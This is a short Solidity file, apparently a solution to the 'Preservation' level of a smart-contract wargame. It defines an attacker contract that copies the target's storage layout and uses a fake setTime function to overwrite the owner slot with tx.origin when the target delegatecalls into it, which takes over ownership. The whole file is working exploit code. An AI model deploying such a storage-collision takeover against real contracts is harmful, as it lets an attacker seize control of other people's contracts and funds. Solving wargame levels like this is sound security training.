// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/16-Preservation.sol";

contract PreservationAttacker {
    address public timeZone1Library; // slot 0
    address public timeZone2Library; // slot 1
    address public owner;            // slot 2
    Preservation public preservation;

    constructor(address _preservation) {
        preservation = Preservation(_preservation);
    }

    function setTime(uint256) public {
        owner = tx.origin;
    }
}